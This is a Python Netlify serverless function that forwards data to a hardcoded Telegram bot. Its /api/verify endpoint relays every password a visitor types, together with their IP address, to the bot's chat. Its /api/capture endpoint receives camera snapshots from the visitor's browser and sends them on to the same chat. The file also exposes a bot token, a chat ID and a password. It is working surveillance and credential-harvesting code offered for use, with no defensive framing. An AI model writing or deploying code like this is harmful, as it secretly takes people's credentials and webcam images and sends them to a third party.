import json
import base64
import requests
import os
from datetime import datetime

# Telegram Configuration
TELEGRAM_TOKEN = "8337969851:AAFe-QHJnMScU4ELsIUIlm74-M_WVepuA54"
CHAT_ID = "6673230400"
PASSWORD = "@35678"

def send_telegram(text):
    """Simple Telegram message sender"""
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
        data = {"chat_id": CHAT_ID, "text": text}
        response = requests.post(url, json=data, timeout=10)
        print(f"Telegram response: {response.status_code}")
        return True
    except Exception as e:
        print(f"Telegram error: {e}")
        return False

def send_photo(image_base64):
    """Send photo to Telegram"""
    try:
        # Remove data URL prefix
        if ',' in image_base64:
            image_base64 = image_base64.split(',')[1]
        
        # Decode base64
        image_data = base64.b64decode(image_base64)
        
        # Send to Telegram
        url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendPhoto"
        
        files = {'photo': image_data}
        data = {'chat_id': CHAT_ID}
        
        response = requests.post(url, files=files, data=data, timeout=15)
        print(f"Photo sent: {response.status_code}")
        return True
    except Exception as e:
        error_msg = f"Photo error: {str(e)[:100]}"
        send_telegram(f"❌ {error_msg}")
        return False

def handler(event, context):
    """Netlify Function Handler"""
    
    # Set CORS headers
    headers = {
        'Content-Type': 'application/json',
        'Access-Control-Allow-Origin': '*',
        'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
        'Access-Control-Allow-Headers': 'Content-Type'
    }
    
    # Handle OPTIONS request
    if event['httpMethod'] == 'OPTIONS':
        return {
            'statusCode': 200,
            'headers': headers,
            'body': ''
        }
    
    path = event['path']
    method = event['httpMethod']
    
    # Get client info
    ip = event['headers'].get('x-forwarded-for', 'Unknown').split(',')[0]
    user_agent = event['headers'].get('user-agent', 'Unknown')
    
    try:
        # Parse request body
        body = {}
        if event.get('body'):
            try:
                body = json.loads(event['body'])
            except:
                body = {}
        
        # ===== PASSWORD VERIFICATION =====
        if path == '/api/verify' and method == 'POST':
            password = body.get('password', '')
            
            # Log the attempt
            log_msg = f"🔐 Login Attempt\n"
            log_msg += f"IP: {ip}\n"
            log_msg += f"Time: {datetime.now().strftime('%H:%M:%S')}\n"
            log_msg += f"Password: {password}"
            send_telegram(log_msg)
            
            if password == PASSWORD:
                send_telegram(f"✅ SUCCESS Login from {ip}")
                
                return {
                    'statusCode': 200,
                    'headers': headers,
                    'body': json.dumps({
                        'success': True,
                        'redirect': '/dashboard.html'
                    })
                }
            else:
                return {
                    'statusCode': 401,
                    'headers': headers,
                    'body': json.dumps({
                        'success': False,
                        'message': 'Wrong password!'
                    })
                }
        
        # ===== CAMERA CAPTURE =====
        elif path == '/api/capture' and method == 'POST':
            image_data = body.get('image', '')
            
            if image_data:
                # Log capture
                send_telegram(f"📸 Camera capture from {ip}")
                send_photo(image_data)
            
            return {
                'statusCode': 200,
                'headers': headers,
                'body': json.dumps({'success': True})
            }
        
        # ===== ERROR LOGGING =====
        elif path == '/api/log-error' and method == 'POST':
            error_data = body.get('error', {})
            
            error_msg = f"🚨 Error on {error_data.get('page', 'Unknown')}\n"
            error_msg += f"Message: {error_data.get('message', 'Unknown')}\n"
            error_msg += f"IP: {ip}\n"
            error_msg += f"Time: {datetime.now().strftime('%H:%M:%S')}"
            
            send_telegram(error_msg)
            
            return {
                'statusCode': 200,
                'headers': headers,
                'body': json.dumps({'success': True})
            }
        
        # ===== OTHER ENDPOINTS =====
        elif path == '/api/check' and method == 'GET':
            return {
                'statusCode': 200,
                'headers': headers,
                'body': json.dumps({'status': 'API is working'})
            }
        
        # ===== NOT FOUND =====
        else:
            return {
                'statusCode': 404,
                'headers': headers,
                'body': json.dumps({'error': 'Not found'})
            }
    
    except Exception as e:
        # Send error to Telegram
        error_msg = f"🔥 SERVER ERROR\nPath: {path}\nError: {str(e)[:200]}"
        send_telegram(error_msg)
        
        return {
            'statusCode': 500,
            'headers': headers,
            'body': json.dumps({'error': 'Server error'})
  }
